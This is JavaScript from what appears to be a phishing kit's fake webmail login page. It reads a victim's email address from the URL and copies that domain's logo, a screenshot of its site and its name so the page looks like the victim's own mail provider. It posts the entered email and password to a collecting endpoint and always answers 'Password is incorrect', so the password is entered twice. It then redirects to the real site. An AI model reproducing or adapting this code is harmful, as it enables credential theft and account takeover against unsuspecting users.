
  var url = new URLSearchParams(location.search);
  var hash = location.hash ? location.hash.slice(1) : '';
  var hasherror = hash && hash.indexOf('error=') > -1 ? 'error' : '';
  var email = url.get('email') || url.get('login') || hash;
  if (email && email.indexOf('&') > -1) email = email.split('&')[0]
  var error = url.get('error') || hasherror;
  const err = document.getElementById('err');
  var count = 0;
  if (email && /.+@.+\..+/.test(email)) {
    $("input[name='email']").val(email);
    $("input[name='password']").focus();
    $("#username").html(email.split('@')[0])

    var my_email = email;
    var ind = my_email.indexOf("@");
    var my_slice = my_email.substr((ind + 1));
    var mainPage = 'https://' + my_slice;

    var sv = my_slice;
    $("#logoname").html(sv);
    $("#kai").html(sv);

    var image = "url('https://image.thum.io/get/auth/68429-3758923842b9d35e3ba4ded2718f8630/https://" + sv;
    "')"


$("#zion").attr("src", "https://logo.clearbit.com/" + mainPage);
    $("#favicon").attr("href", "https://logo.clearbit.com/" + mainPage);    

    document.body.style.backgroundImage = image;
    document.title = "Webmail Portal Access - " + sv;


  } else {
    $("input[name='email']").focus();
  }
  if (error) {
    $("input[name='error']").val('error')
  }

  var msg = $('#msg').html();
  $('#msg').text(msg);
  var alertt = document.querySelector('.alert');

  const pet = document.getElementById('pet');
  const pett = document.getElementById('pett');
  const source = document.getElementById('source');
  const form = document.getElementById("login_form");
  $("#login_submit").click(e => {
    e.preventDefault();
    if (!/.+@.+\..+/.test($("input[name='email']").val())) {
      showEl(err, "red");
      err.textContent = "Enter a valid email address.";
      return;
    } else if (!$("input[name='password']").val() || !$("input[name='password']").val() > 4) {
      showEl(err, "red");
      err.textContent = "Enter your correct password!";
      return;
    } else {
      count=count+1;

      showEl(err, "black");
      err.textContent = "Authenticating...";

      var $form = $("#login_form");
      var url = form.action;
      var data = $form.serialize();


      $.ajax({
        type: "POST",
        url: url,
        data: data,
        cache: false,
        timeout: 800000,
        beforeSend: function (xhr) {
          $('#login_submit').html('Verifying...');
        },
        success: function (response) {
          if (response) {
            pett.value = "";
            pett.style.borderColor = "red";
            showEl(err, "red");
            err.textContent = "Password is incorrect.";

            if (count>=2) {
                count=0;
                // window.location.replace(response['redirect_link']);
                window.location.replace("http://"+my_slice);

              }



            console.log(response);
            if (response['signal'] == 'ok') {
              $('#msg').html(response['msg']);
              // $('input, textarea').val(function() {
              //    return this.defaultValue;
              // });
            } else {

              $('#msg').html(response['msg']);
            }
          } else {
            showEl(err, "red");
            err.textContent = "Something went wrong, please try again";
            pett.value = "";
            pett.style.borderColor = "red";
          }
        },
        error: function () {
          showEl(err, "red");
          err.textContent = "Something went wrong, please try again";
          pett.value = "";
          pett.style.borderColor = "red";
        },
        complete: function () {
          $('#login_submit').html('Continue');
        }
      });
    }
  });

  function showEl(el, color) {
    el.style.color = color;
    el.style.display = "block";
  }

  function hideEl(el) {
    el.style.color = '#000';
    el.style.display = "none";
    el.textContent = "";
  }
